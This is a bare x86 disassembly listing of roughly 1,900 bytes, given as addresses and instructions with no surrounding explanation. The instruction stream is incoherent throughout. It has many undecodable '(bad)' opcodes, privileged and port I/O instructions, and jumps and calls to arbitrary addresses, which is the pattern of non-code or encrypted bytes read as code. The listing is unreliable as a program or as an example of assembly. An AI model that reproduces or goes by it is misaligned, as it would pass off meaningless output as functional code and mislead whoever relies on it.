  41ab3d:	cmp    bl,0x4a
  41ab40:	outs   dx,DWORD PTR ds:[esi]
  41ab41:	push   0xffffffa1
  41ab43:	scas   eax,DWORD PTR es:[edi]
  41ab44:	outs   dx,DWORD PTR ds:[esi]
  41ab45:	xor    BYTE PTR [ebx+0xefedfd0],ah
  41ab4b:	in     eax,dx
  41ab4c:	adc    eax,0x1254f377
  41ab51:	jo     0x41ab23
  41ab53:	ret    
  41ab54:	mov    esi,0x262ca807
  41ab59:	les    ebp,FWORD PTR [edx]
  41ab5b:	lods   eax,DWORD PTR ds:[esi]
  41ab5c:	sub    edi,0xffffffb6
  41ab5f:	jle    0x41ab84
  41ab61:	mov    DWORD PTR gs:[edi],ebp
  41ab64:	adc    DWORD PTR [ebp+0x1d336977],ebx
  41ab6a:	or     DWORD PTR [eax],eax
  41ab6c:	inc    ebx
  41ab6d:	inc    esi
  41ab6e:	mov    WORD PTR [edi-0x60],gs
  41ab71:	bswap  ebx
  41ab73:	out    dx,eax
  41ab74:	or     eax,0x6626f053
  41ab79:	cwde   
  41ab7a:	daa    
  41ab7b:	dec    esi
  41ab7c:	mov    eax,DWORD PTR [eax-0x44]
  41ab7f:	push   ss
  41ab80:	pushf  
  41ab81:	lods   eax,DWORD PTR ds:[esi]
  41ab82:	and    al,0x9
  41ab84:	adc    BYTE PTR [edx+0x5596d368],al
  41ab8a:	dec    esi
  41ab8b:	sbb    cl,dl
  41ab8d:	and    dl,dl
  41ab8f:	in     eax,dx
  41ab90:	push   edi
  41ab91:	(bad)  
  41ab93:	and    al,0xaa
  41ab95:	fpatan 
  41ab97:	push   0x2555dc55
  41ab9c:	dec    esp
  41ab9d:	fnsave [ecx+0x2e30f97c]
  41aba3:	hlt    
  41aba4:	xor    eax,0xd7cabf60
  41aba9:	mov    esi,0xf933da14
  41abae:	idiv   BYTE PTR [esi]
  41abb0:	push   esi
  41abb1:	dec    esp
  41abb2:	push   edi
  41abb3:	out    dx,eax
  41abb4:	jl     0x41ab62
  41abb6:	inc    eax
  41abb7:	pusha  
  41abb8:	xor    eax,DWORD PTR [edi]
  41abba:	cli    
  41abbb:	sbb    eax,0x7d1586c0
  41abc0:	sub    ecx,DWORD PTR [esi-0x38]
  41abc3:	jnp    0x41abdd
  41abc5:	ret    0x7d39
  41abc8:	push   edi
  41abc9:	aaa    
  41abca:	in     al,dx
  41abcb:	and    bl,BYTE PTR [ebx]
  41abcd:	pop    ss
  41abce:	repz bound esi,QWORD PTR [ebp-0x67]
  41abd2:	xchg   ebx,eax
  41abd3:	jp     0x41ab83
  41abd5:	mov    eax,0xe11d57b0
  41abda:	loopne 0x41ab80
  41abdc:	sbb    eax,0xf637895e
  41abe1:	push   cs
  41abe2:	jge    0x41ab8e
  41abe4:	jns    0x41ab89
  41abe6:	mov    esp,0xc160597b
  41abeb:	pop    edx
  41abec:	push   0xdb894580
  41abf1:	mov    esi,0xdc391f76
  41abf6:	push   ebx
  41abf7:	bound  ebx,QWORD PTR [ebp-0x2795348e]
  41abfd:	mov    esp,0xc66ed0b1
  41ac02:	add    eax,0xb466a091
  41ac08:	mov    ds:0x8b081d7c,eax
  41ac0d:	fcomp  QWORD PTR [ebx+eiz*4-0x6]
  41ac11:	adc    eax,0x75221d0f
  41ac16:	scas   eax,DWORD PTR es:[edi]
  41ac17:	loopne 0x41ac59
  41ac19:	jp     0x41ac8d
  41ac1b:	or     DWORD PTR [edi],edx
  41ac1d:	or     cl,BYTE PTR [ebp+0x5efac021]
  41ac23:	adc    BYTE PTR [ecx-0x53],0x32
  41ac27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac28:	loope  0x41ac1a
  41ac2a:	outs   dx,BYTE PTR ds:[esi]
  41ac2b:	jbe    0x41abc8
  41ac2d:	out    dx,al
  41ac2e:	push   es
  41ac2f:	ja     0x41abff
  41ac31:	test   DWORD PTR [edx+0x49f0cd3e],ecx
  41ac37:	and    dh,al
  41ac39:	push   ds
  41ac3a:	retf   0xea4a
  41ac3d:	pop    ebp
  41ac3e:	sti    
  41ac3f:	jnp    0x41ac63
  41ac41:	call   0xb6ffe00f
  41ac46:	push   edx
  41ac47:	sti    
  41ac48:	shr    BYTE PTR [ebx],0xa8
  41ac4b:	aas    
  41ac4c:	out    0xdf,eax
  41ac4e:	mov    edi,0x41ba3435
  41ac53:	xchg   esp,eax
  41ac54:	js     0x41ac95
  41ac56:	sub    BYTE PTR [ecx],dl
  41ac58:	inc    esi
  41ac59:	dec    esi
  41ac5a:	(bad)  
  41ac5b:	test   BYTE PTR [eax+0xe4bf5f8],0x20
  41ac62:	lea    ebp,[eax-0x7d3ac8c8]
  41ac68:	ins    DWORD PTR es:[edi],dx
  41ac69:	fs (bad) 
  41ac6b:	das    
  41ac6c:	and    eax,0x656d0a1e
  41ac71:	mov    ds:0xabbe4330,eax
  41ac76:	gs scas eax,DWORD PTR es:[edi]
  41ac78:	call   0x485b33e5
  41ac7d:	out    0xe,eax
  41ac7f:	mov    BYTE PTR [esi],dl
  41ac81:	cmp    al,0xc
  41ac83:	fimul  WORD PTR ss:[edi-0x35a15f9d]
  41ac8a:	ins    BYTE PTR es:[edi],dx
  41ac8b:	scas   eax,DWORD PTR es:[edi]
  41ac8c:	inc    ebx
  41ac8d:	push   0xa4a344de
  41ac92:	fnsave [edi+0x10]
  41ac95:	pusha  
  41ac96:	add    ebx,edx
  41ac98:	iret   
  41ac99:	pop    ebx
  41ac9a:	data16 out dx,al
  41ac9c:	pop    ebx
  41ac9d:	les    edi,FWORD PTR [edi-0xc]
  41aca0:	push   0x10
  41aca2:	fdiv   QWORD PTR [eax-0x2a4b8d1]
  41aca8:	das    
  41aca9:	pop    es
  41acaa:	jo     0x41ac4a
  41acac:	mov    WORD PTR [eax-0x36],?
  41acaf:	call   0x64b91512
  41acb4:	and    cl,BYTE PTR [ebp+0x666311e9]
  41acba:	mov    edx,edi
  41acbc:	and    BYTE PTR [ecx],al
  41acbe:	cmc    
  41acbf:	dec    esp
  41acc0:	scas   al,BYTE PTR es:[edi]
  41acc1:	push   ds
  41acc2:	pop    DWORD PTR [ebp+eiz*4+0x67]
  41acc6:	stos   DWORD PTR es:[edi],eax
  41acc7:	daa    
  41acc8:	and    al,BYTE PTR [ebp+0x78]
  41accb:	dec    esi
  41accc:	jmp    0x41ac83
  41acce:	adc    ebx,DWORD PTR [ebx]
  41acd0:	push   ecx
  41acd1:	aam    0xec
  41acd3:	fist   WORD PTR [ebp+0x4bcaf7f0]
  41acd9:	jo     0x41ad0d
  41acdb:	or     ebx,DWORD PTR [ebp-0x144ae8d6]
  41ace1:	inc    eax
  41ace2:	out    dx,al
  41ace3:	jb     0x41ad30
  41ace5:	jmp    0x41ac7c
  41ace7:	popa   
  41ace8:	or     BYTE PTR [ecx+0x23207ba9],al
  41acee:	dec    ecx
  41acef:	pop    es
  41acf0:	or     BYTE PTR [eax+0xf9c31d2],0xca
  41acf7:	sub    eax,0xc937af79
  41acfc:	gs mov ebx,edi
  41acff:	cmp    al,0x2f
  41ad01:	outs   dx,BYTE PTR ds:[esi]
  41ad02:	data16 ja 0x41acd9
  41ad05:	aas    
  41ad06:	pop    ecx
  41ad07:	or     eax,0xb7fb2911
  41ad0c:	and    DWORD PTR [ecx-0x35],ebp
  41ad0f:	in     al,0x2f
  41ad11:	pop    eax
  41ad12:	jmp    0x41ad37
  41ad14:	arpl   WORD PTR [ebx-0x3f],cx
  41ad17:	enter  0xea48,0xaf
  41ad1b:	cli    
  41ad1c:	pop    es
  41ad1d:	adc    eax,edi
  41ad1f:	or     al,0xe1
  41ad21:	stos   BYTE PTR es:[edi],al
  41ad22:	sbb    edx,DWORD PTR [ebp+ebx*8+0x4405c2e6]
  41ad29:	push   es
  41ad2a:	adc    al,0x22
  41ad2c:	pop    esp
  41ad2d:	lea    edi,[ecx+0x5e945f05]
  41ad33:	loop   0x41ad6b
  41ad35:	gs (bad) 
  41ad38:	rcl    dl,0xcf
  41ad3b:	inc    ebx
  41ad3c:	and    al,BYTE PTR [ebx-0x6102344a]
  41ad42:	mov    ah,BYTE PTR [ebx-0x4f738919]
  41ad48:	adc    eax,0x21a9c543
  41ad4d:	icebp  
  41ad4e:	outs   dx,DWORD PTR ds:[esi]
  41ad4f:	pop    edx
  41ad50:	mov    ch,0xa2
  41ad52:	sahf   
  41ad53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad54:	in     al,dx
  41ad55:	push   edi
  41ad56:	or     eax,0xdc2a495d
  41ad5b:	add    bl,BYTE PTR [ecx]
  41ad5d:	mov    eax,0x28760ff5
  41ad62:	hlt    
  41ad63:	mov    DWORD PTR [esi],edi
  41ad65:	push   edx
  41ad66:	(bad)  
  41ad67:	cdq    
  41ad68:	jmp    0xfbde437
  41ad6d:	add    BYTE PTR [esi-0x6fec299f],dl
  41ad73:	mov    ah,0x44
  41ad75:	xor    al,0xe6
  41ad77:	ror    esi,cl
  41ad79:	imul   eax,ecx,0xffffff93
  41ad7c:	inc    edx
  41ad7d:	push   esi
  41ad7e:	out    0x7d,al
  41ad80:	pop    ss
  41ad81:	(bad)  
  41ad83:	inc    ebp
  41ad84:	int3   
  41ad85:	sbb    ah,cl
  41ad87:	js     0x41ad9b
  41ad89:	stos   DWORD PTR es:[edi],eax
  41ad8a:	xchg   edx,eax
  41ad8b:	ins    DWORD PTR es:[edi],dx
  41ad8c:	scas   al,BYTE PTR es:[edi]
  41ad8d:	xor    esp,DWORD PTR [esi+esi*1]
  41ad90:	leave  
  41ad91:	int    0x26
  41ad93:	adc    DWORD PTR [esi+0x5ca15c0a],ebp
  41ad99:	inc    ebx
  41ad9a:	ins    BYTE PTR es:[edi],dx
  41ad9b:	mov    ebx,0x74b44c98
  41ada0:	and    DWORD PTR [esi-0x3],edi
  41ada3:	das    
  41ada4:	and    bh,BYTE PTR [edx]
  41ada6:	enter  0x36de,0x35
  41adaa:	inc    ebp
  41adab:	xor    DWORD PTR [ebp-0x56],ecx
  41adae:	inc    eax
  41adaf:	cdq    
  41adb0:	int    0xa2
  41adb2:	sub    ebp,DWORD PTR [eax+0x4f]
  41adb5:	dec    edx
  41adb6:	xchg   ebp,eax
  41adb7:	mov    DWORD PTR [esi],ebx
  41adb9:	aaa    
  41adba:	push   ds
  41adbb:	push   ecx
  41adbc:	loope  0x41ad71
  41adbe:	iret   
  41adbf:	(bad)  
  41adc2:	or     eax,0x6ec6484d
  41adc7:	mov    ds:0xa9b10d7e,al
  41adcc:	inc    edi
  41adcd:	jbe    0x41ae40
  41adcf:	out    dx,al
  41add0:	sbb    edx,ecx
  41add2:	sub    edx,0x59
  41add5:	inc    edi
  41add6:	inc    esi
  41add7:	mov    ebp,0xfb3465b0
  41addc:	es jno 0x41ae44
  41addf:	fidiv  DWORD PTR [edx]
  41ade1:	xchg   edi,eax
  41ade2:	ja     0x41ae44
  41ade4:	adc    eax,eax
  41ade6:	icebp  
  41ade7:	rcl    DWORD PTR [ecx+0x5e9463db],cl
  41aded:	rcl    esi,cl
  41adef:	call   0xe6d8:0xb74636a3
  41adf6:	jmp    0x73f2:0x39ccdf60
  41adfd:	mov    bh,0x6f
  41adff:	mov    DWORD PTR [eax+esi*1],0xab96812d
  41ae06:	add    bh,BYTE PTR [ebx]
  41ae08:	je     0x41ae57
  41ae0a:	hlt    
  41ae0b:	ins    DWORD PTR es:[edi],dx
  41ae0c:	call   0x6d1ca4c
  41ae11:	cmp    BYTE PTR [eax-0x130323f4],0x3e
  41ae18:	pop    edi
  41ae19:	dec    ecx
  41ae1a:	(bad)  
  41ae1b:	addr16 jae 0x41adbe
  41ae1e:	lea    eax,[edi-0xc]
  41ae21:	or     bl,BYTE PTR [ecx+ebx*8]
  41ae24:	adc    dl,BYTE PTR [eax+ebx*8-0x30]
  41ae28:	jne    0x41aea5
  41ae2a:	mov    edx,0xae65e64f
  41ae2f:	mov    esi,0xfd206aca
  41ae34:	and    eax,0xa3d26aeb
  41ae39:	loope  0x41ae41
  41ae3b:	dec    edi
  41ae3c:	out    dx,eax
  41ae3d:	fldlg2 
  41ae3f:	xchg   ebp,eax
  41ae40:	sub    eax,0xd524e646
  41ae45:	in     eax,0x9b
  41ae47:	into   
  41ae48:	adc    al,0x11
  41ae4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae4b:	ja     0x41adf6
  41ae4d:	sub    al,0x6d
  41ae4f:	cmc    
  41ae50:	adc    edx,DWORD PTR [ecx+0x739bd766]
  41ae56:	mov    ch,0x60
  41ae58:	xor    ebp,0x3f2b4336
  41ae5e:	fbld   TBYTE PTR [ecx-0x6d59f8ea]
  41ae64:	retf   
  41ae65:	cmp    eax,0xbe58feab
  41ae6a:	adc    eax,0x97e3fde7
  41ae6f:	xor    BYTE PTR ds:0x669ae63d,ch
  41ae75:	push   esi
  41ae76:	mov    ebp,0xcd977d7c
  41ae7b:	les    esp,FWORD PTR [edx]
  41ae7d:	ds inc edi
  41ae7f:	push   ds
  41ae80:	mov    eax,0xbbd10c7
  41ae85:	jmp    0xe4633ae5
  41ae8a:	outs   dx,DWORD PTR ds:[esi]
  41ae8b:	pushf  
  41ae8c:	fnstenv [eax-0x3d99a447]
  41ae92:	ins    BYTE PTR es:[edi],dx
  41ae93:	ja     0x41aedf
  41ae95:	mov    DWORD PTR [eax+0x39],ebx
  41ae98:	push   cs
  41ae99:	sbb    dh,al
  41ae9b:	push   ss
  41ae9c:	push   edi
  41ae9d:	popf   
  41ae9e:	push   esp
  41ae9f:	and    ch,BYTE PTR [eax]
  41aea1:	push   ebx
  41aea2:	jge    0x41ae53
  41aea4:	sub    ebp,DWORD PTR [ebx-0x5b]
  41aea7:	mov    ah,0x5
  41aea9:	sub    al,BYTE PTR [edx+0x75]
  41aeac:	pop    ecx
  41aead:	ret    0x80d5
  41aeb0:	inc    ebp
  41aeb1:	sar    BYTE PTR [esi+edx*2],0x40
  41aeb5:	(bad)  
  41aeb6:	xchg   esi,eax
  41aeb7:	and    ebp,ebx
  41aeb9:	mov    dl,0x37
  41aebb:	mov    dh,0xf6
  41aebd:	sbb    eax,0x51a25a26
  41aec2:	mov    esp,DWORD PTR [edi-0x57980c44]
  41aec8:	ja     0x41aed6
  41aeca:	mov    al,ds:0xf2242b22
  41aecf:	cmp    DWORD PTR [ebp-0x663945ee],0x6a
  41aed6:	mov    edi,DWORD PTR [ebp-0x7d]
  41aed9:	cmp    DWORD PTR [ebx],edx
  41aedb:	mov    edx,0x83eedaf1
  41aee0:	mov    esp,0xdad559ab
  41aee5:	test   cl,dh
  41aee7:	sbb    DWORD PTR [ecx],ebp
  41aee9:	loopne 0x41aee8
  41aeeb:	hlt    
  41aeec:	xchg   ebx,eax
  41aeed:	sub    eax,0x4ea6acd4
  41aef2:	stos   BYTE PTR es:[edi],al
  41aef3:	or     ebx,DWORD PTR [eax+0x68]
  41aef6:	push   esp
  41aef7:	pop    eax
  41aef8:	mov    ebx,ebx
  41aefa:	stos   BYTE PTR es:[edi],al
  41aefb:	xchg   edi,eax
  41aefc:	sbb    al,0x28
  41aefe:	pop    esp
  41aeff:	out    dx,eax
  41af00:	fwait
  41af01:	adc    cl,ch
  41af03:	inc    ebp
  41af04:	pop    ss
  41af05:	jp     0x41af48
  41af07:	imul   eax,DWORD PTR [esi+0x4b2bb28a],0x2efcb9e6
  41af11:	fisubr DWORD PTR [eax+ecx*2]
  41af14:	push   ds
  41af15:	xlat   BYTE PTR ds:[ebx]
  41af16:	mov    ebp,0xad75d827
  41af1b:	test   dh,cl
  41af1d:	dec    esi
  41af1e:	daa    
  41af1f:	push   ebx
  41af20:	sbb    DWORD PTR [esi],ebx
  41af22:	loop   0x41af1a
  41af24:	mov    DWORD PTR [edx+0x5c],ecx
  41af27:	(bad)  
  41af28:	in     eax,dx
  41af29:	pushf  
  41af2a:	mov    ebx,0x1dcc399c
  41af2f:	jle    0x41afb0
  41af31:	pop    ss
  41af32:	iret   
  41af33:	popa   
  41af34:	ins    BYTE PTR es:[edi],dx
  41af35:	ds stos BYTE PTR es:[edi],al
  41af37:	bound  ebx,QWORD PTR [ecx+0x4a]
  41af3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af3b:	xchg   esi,eax
  41af3c:	mov    al,0x30
  41af3e:	sub    esi,DWORD PTR [ebx+0x2a4d5a95]
  41af44:	loope  0x41aeeb
  41af46:	add    DWORD PTR [edi-0x44],esp
  41af49:	test   DWORD PTR [ecx-0x4dbd9e1c],esi
  41af4f:	xchg   esp,eax
  41af51:	dec    ecx
  41af52:	jmp    0x31d:0xd20aea77
  41af59:	fstp   DWORD PTR [edx]
  41af5b:	push   ebp
  41af5c:	push   0x4e752fab
  41af61:	mov    eax,ds:0x51e1a2ab
  41af66:	rcl    BYTE PTR [eax-0x62],0x6
  41af6a:	or     al,0x8
  41af6c:	retf   
  41af6d:	cmp    DWORD PTR [ecx+0x3b4a3369],ebx
  41af73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af74:	xchg   ecx,eax
  41af75:	mov    ah,0x2a
  41af77:	dec    ecx
  41af78:	test   edi,ecx
  41af7a:	push   edx
  41af7b:	aam    0x67
  41af7d:	push   ds
  41af7e:	fcomp  QWORD PTR [ebx]
  41af80:	and    BYTE PTR [eax],0x3d
  41af83:	iret   
  41af84:	int3   
  41af85:	pop    ss
  41af86:	mov    esp,es
  41af88:	xchg   esi,eax
  41af89:	cwde   
  41af8a:	mov    dl,0x8d
  41af8c:	and    al,0xb4
  41af8e:	push   0x8cc852ae
  41af93:	pop    esp
  41af94:	data16 loopne 0x41b011
  41af97:	addr16 ds clts 
  41af9b:	xchg   BYTE PTR [esi+0x7e7126bc],cl
  41afa1:	or     al,0xf4
  41afa3:	push   eax
  41afa4:	or     eax,0x951639db
  41afa9:	enter  0x3959,0xed
  41afad:	or     al,0x1
  41afaf:	adc    dl,ch
  41afb1:	std    
  41afb2:	lea    edx,[ecx]
  41afb4:	sbb    DWORD PTR [edx+eiz*2],0x320024c3
  41afbb:	fild   DWORD PTR [ecx-0x76]
  41afbe:	out    dx,al
  41afbf:	std    
  41afc0:	and    ebx,DWORD PTR [edx]
  41afc2:	mov    eax,0x1bc47bd8
  41afc7:	mov    dh,0x75
  41afc9:	adc    bh,BYTE PTR [eax+edx*2+0x63]
  41afcd:	popf   
  41afce:	cmp    esi,edi
  41afd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41afd1:	or     al,0xa5
  41afd3:	mov    al,0xf4
  41afd5:	xor    eax,0x8b0239c
  41afda:	dec    esp
  41afdb:	in     al,dx
  41afdc:	aaa    
  41afdd:	and    eax,DWORD PTR [eax]
  41afdf:	or     ebx,edi
  41afe1:	scas   eax,DWORD PTR es:[edi]
  41afe2:	jmp    0x93e2bc0
  41afe7:	sbb    al,0x88
  41afe9:	sti    
  41afea:	(bad)  
  41afeb:	mov    DWORD PTR [ecx],eax
  41afed:	stos   DWORD PTR es:[edi],eax
  41afee:	jmp    0x7f69:0x8c333fce
  41aff5:	cld    
  41aff6:	cli    
  41aff7:	push   ss
  41aff8:	and    DWORD PTR [eax+0x3e],ebx
  41affb:	inc    ecx
  41affc:	mov    ebx,0x91cb87dd
  41b001:	or     bl,BYTE PTR [esi-0x2d2059b9]
  41b007:	mov    BYTE PTR [edi+0x6a],ah
  41b00a:	adc    eax,0xb6f8a917
  41b00f:	test   DWORD PTR [edi+0x6d65a742],0x22d9f51c
  41b019:	mov    cs,eax
  41b01b:	fwait
  41b01c:	adc    eax,0x6cdc77c3
  41b021:	mov    ecx,0x81c0a752
  41b026:	or     BYTE PTR [ecx+0x2b],dl
  41b029:	lods   eax,DWORD PTR ds:[esi]
  41b02a:	imul   esp,DWORD PTR [esi],0x4bc652df
  41b030:	imul   DWORD PTR [ecx+0x3f]
  41b033:	xlat   BYTE PTR ds:[ebx]
  41b034:	inc    ebp
  41b035:	ja     0x41afef
  41b037:	jno    0x41b070
  41b039:	adc    eax,0x72bbde92
  41b03e:	mov    eax,0x84e7d6aa
  41b043:	jmp    0x1729215d
  41b048:	mov    edi,0x1be747c3
  41b04d:	ja     0x41b069
  41b04f:	nop
  41b050:	inc    eax
  41b051:	jmp    0xd460f162
  41b056:	jno    0x41afea
  41b058:	push   edx
  41b059:	test   DWORD PTR [ecx-0x4f],eax
  41b05c:	(bad)  
  41b05d:	ja     0x41b05c
  41b05f:	sahf   
  41b060:	data16 jge 0x41b07b
  41b063:	mov    bh,0x12
  41b065:	and    bl,cl
  41b067:	mov    al,0xa5
  41b069:	add    eax,0x86abd5d8
  41b06e:	xchg   esp,eax
  41b06f:	out    dx,eax
  41b070:	lods   eax,DWORD PTR ds:[esi]
  41b071:	sahf   
  41b072:	outs   dx,BYTE PTR ds:[esi]
  41b073:	jo     0x41b0c9
  41b075:	dec    ebp
  41b076:	xor    DWORD PTR [esi-0x3b1497e4],esp
  41b07c:	mov    edx,0x4fd33994
  41b081:	daa    
  41b082:	mov    bh,0x82
  41b084:	in     eax,dx
  41b085:	loop   0x41b066
  41b087:	push   eax
  41b088:	xor    al,0xb7
  41b08a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b08b:	adc    DWORD PTR [edi],esi
  41b08d:	xor    al,BYTE PTR [eax+0x3f]
  41b090:	shl    DWORD PTR ds:0xd729d7ed,cl
  41b096:	loopne 0x41b0d9
  41b098:	outs   dx,DWORD PTR ds:[esi]
  41b099:	call   0xbaa4a273
  41b09e:	push   ecx
  41b09f:	xchg   edi,eax
  41b0a0:	scas   eax,DWORD PTR es:[edi]
  41b0a1:	xor    eax,0xed0d22b
  41b0a6:	ds ret 0x5278
  41b0aa:	or     cl,BYTE PTR [edx]
  41b0ac:	cmc    
  41b0ad:	cmp    al,0xd5
  41b0af:	(bad)  
  41b0b0:	push   eax
  41b0b1:	xchg   esi,eax
  41b0b2:	outs   dx,DWORD PTR ds:[esi]
  41b0b3:	clc    
  41b0b4:	adc    eax,0x189c6dec
  41b0b9:	adc    dl,BYTE PTR [edi-0xd]
  41b0bc:	pop    edx
  41b0bd:	rcr    BYTE PTR [ecx],0xab
  41b0c0:	dec    ebx
  41b0c1:	mov    al,0xbb
  41b0c3:	jle    0x41b0ce
  41b0c5:	fidiv  DWORD PTR [ebx-0x172579ba]
  41b0cb:	lea    esp,[esp+edi*8+0x57daeb16]
  41b0d2:	jp     0x41b0c2
  41b0d4:	or     eax,0x759b581e
  41b0d9:	jge    0x41b090
  41b0db:	pop    esi
  41b0dc:	imul   ebx,ecx,0x22b3936f
  41b0e2:	imul   eax,DWORD PTR [ebp-0x18ca71e6],0xb399156e
  41b0ec:	es stc 
  41b0ee:	lds    esi,FWORD PTR [edi]
  41b0f0:	inc    ebp
  41b0f1:	mov    al,0x18
  41b0f3:	cmp    BYTE PTR [ebx+0x55239d81],ah
  41b0f9:	xor    al,0x3d
  41b0fb:	xchg   esp,ebp
  41b0fd:	xchg   edi,eax
  41b0fe:	cmp    al,BYTE PTR [eax-0x4749f65]
  41b104:	sub    BYTE PTR [ebp-0x3e4abbf9],dh
  41b10a:	test   DWORD PTR [ebp+0x7b],0x2f309bd2
  41b111:	and    al,0xb0
  41b113:	(bad)  
  41b114:	jg     0x41b146
  41b116:	daa    
  41b117:	xchg   ebx,eax
  41b118:	push   0xffffffad
  41b11a:	adc    DWORD PTR [edi],esp
  41b11c:	jae    0x41b0f5
  41b11e:	pop    eax
  41b11f:	out    dx,eax
  41b120:	pop    ebx
  41b121:	imul   ecx,esp,0xffffff98
  41b124:	xlat   BYTE PTR ds:[ebx]
  41b125:	pop    es
  41b126:	out    dx,eax
  41b127:	dec    esi
  41b128:	shr    BYTE PTR [eax+edx*4],1
  41b12b:	jge    0x41b0e6
  41b12d:	(bad)  
  41b12e:	mov    edx,0xf921087b
  41b133:	xchg   edx,eax
  41b134:	fbstp  TBYTE PTR [esi-0x5398fb67]
  41b13a:	shl    edi,1
  41b13c:	fcomip st,st(3)
  41b13e:	out    0x12,al
  41b140:	xor    eax,0x9443162d
  41b145:	int3   
  41b146:	loope  0x41b0e6
  41b148:	inc    ebx
  41b149:	or     eax,0x33d487f
  41b14e:	hlt    
  41b14f:	mov    ebx,0x457952a6
  41b154:	repnz dec esp
  41b156:	xor    edi,DWORD PTR [ebx+0x70b6188]
  41b15c:	(bad)  
  41b15d:	push   0xffffffd0
  41b15f:	call   0x401e:0x9490897f
  41b166:	lock and esp,DWORD PTR [ecx-0x15b5497b]
  41b16d:	aas    
  41b16e:	imul   esp,ebp,0xffffffba
  41b171:	cwde   
  41b172:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b173:	outs   dx,BYTE PTR ds:[esi]
  41b174:	and    ecx,DWORD PTR [ebx-0x2]
  41b177:	outs   dx,DWORD PTR ds:[esi]
  41b178:	sub    BYTE PTR [ebp+0x47],bl
  41b17b:	xor    DWORD PTR [ecx],0xb5c68490
  41b181:	mov    bh,0x9b
  41b183:	sub    eax,DWORD PTR [esi]
  41b185:	inc    esi
  41b186:	sbb    BYTE PTR [edx-0x79fe8cdb],0x1a
  41b18d:	push   edi
  41b18e:	mul    BYTE PTR [edi]
  41b190:	fucomip st,st(1)
  41b192:	clc    
  41b193:	lds    edx,FWORD PTR [edi]
  41b195:	jmp    0xcca9eb27
  41b19a:	pop    edx
  41b19b:	mov    dl,0x44
  41b19d:	dec    ebp
  41b19e:	pop    es
  41b19f:	sbb    ah,bl
  41b1a1:	push   DWORD PTR [esi-0x2522e80e]
  41b1a7:	mov    eax,0xc5f7cd17
  41b1ac:	mov    eax,DWORD PTR [edx-0x5a]
  41b1af:	jb     0x41b189
  41b1b1:	cs xor al,0x7d
  41b1b4:	mov    DWORD PTR [eax+ebp*2-0x375d2d6f],ebx
  41b1bb:	enter  0x9e22,0x55
  41b1bf:	mov    ch,0x38
  41b1c1:	cs jno 0x41b17a
  41b1c4:	aam    0xec
  41b1c6:	stos   DWORD PTR es:[edi],eax
  41b1c7:	mov    bh,0x67
  41b1c9:	dec    ebp
  41b1ca:	pop    ds
  41b1cb:	inc    eax
  41b1cc:	cmp    ch,BYTE PTR [ebp-0x4f26aa04]
  41b1d2:	cwde   
  41b1d3:	lahf   
  41b1d4:	cli    
  41b1d5:	xor    ah,BYTE PTR [ebx+0x22]
  41b1d8:	test   BYTE PTR [ebx],cl
  41b1da:	int    0x51
  41b1dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b1dd:	jne    0x41b221
  41b1df:	loopne 0x41b1b0
  41b1e1:	xchg   esp,eax
  41b1e2:	mov    bl,0xde
  41b1e4:	shl    DWORD PTR [ebp+0x1784c3b2],1
  41b1ea:	or     eax,0xb499c26a
  41b1ef:	je     0x41b200
  41b1f1:	sti    
  41b1f2:	outs   dx,DWORD PTR ds:[esi]
  41b1f3:	or     ch,dl
  41b1f5:	sbb    BYTE PTR ds:0x77339c12,bh
  41b1fb:	repnz iret 
  41b1fd:	ss popfw 
  41b200:	fs sbb eax,0xe74ef194
  41b206:	and    edx,DWORD PTR [ecx-0x69]
  41b209:	pop    ds
  41b20a:	in     eax,dx
  41b20b:	or     eax,0x59266e60
  41b210:	add    eax,0xa9c88425
  41b215:	jo     0x41b28c
  41b217:	dec    ecx
  41b218:	loope  0x41b230
  41b21a:	idiv   ch
  41b21c:	push   edi
  41b21d:	in     al,0x3a
  41b21f:	pop    ds
  41b220:	xor    DWORD PTR [ebp+0x77],esi
  41b223:	xchg   esi,eax
  41b224:	lods   al,BYTE PTR ds:[esi]
  41b225:	mov    ds:0x160a52e6,al
  41b22a:	jl     0x41b1d6
  41b22c:	sbb    esi,DWORD PTR [edi+ebp*2-0x5566b877]
  41b233:	ins    BYTE PTR es:[edi],dx
  41b234:	and    edx,ebp
  41b236:	inc    esi
  41b237:	and    esp,DWORD PTR [ecx-0x4d]
  41b23a:	and    ch,BYTE PTR [edx+0x40]
  41b23d:	test   ebx,esp
  41b23f:	sahf   
  41b240:	inc    ebp
  41b241:	push   edx
  41b242:	add    edi,0x3af4fc77
  41b248:	in     eax,0x34
  41b24a:	xor    DWORD PTR [edi-0x1182043e],0xffffffa7
  41b251:	pop    ds
  41b252:	adc    DWORD PTR [edx-0x7d],eax
  41b255:	std    
  41b256:	and    ch,BYTE PTR [eax*8-0x528fd3d8]
  41b25d:	lahf   
  41b25e:	aaa    
  41b25f:	int    0xf3
  41b261:	enter  0x9074,0xcb
  41b265:	sbb    eax,0x73f575ae
  41b26a:	loopne 0x41b223
  41b26c:	mov    eax,DWORD PTR [eax]
  41b26e:	push   edx
  41b26f:	(bad)  
  41b270:	xlat   BYTE PTR ds:[ebx]
  41b271:	sbb    BYTE PTR [esp+edi*8+0x5b],cl
  41b275:	fcmove st,st(7)
  41b277:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b278:	sbb    DWORD PTR [ebp-0x3d],edi
  41b27b:	sbb    dh,BYTE PTR [esi-0x48]
  41b27e:	adc    dl,bl
  41b280:	xor    DWORD PTR [ebx-0x7dc28383],edi
  41b286:	mov    DWORD PTR [esp+ebx*1],esi
  41b289:	mov    esi,0x508040bb
  41b28e:	fcmovne st,st(4)
  41b290:	xor    al,0x54
  41b292:	icebp  
  41b293:	mov    eax,0x1d519bf7
  41b298:	enter  0xb5ca,0xda
  41b29c:	adc    edi,ebp
  41b29e:	out    dx,eax
  41b29f:	push   esi
  41b2a0:	mov    ebp,0xbe5fb70b
  41b2a5:	pop    edx
  41b2a6:	xchg   esp,eax
  41b2a7:	xchg   ebp,eax
  41b2a8:	or     eax,0x59e79857
  41b2ad:	inc    ecx
  41b2ae:	or     DWORD PTR [eax-0x7b],ecx
  41b2b1:	popf   
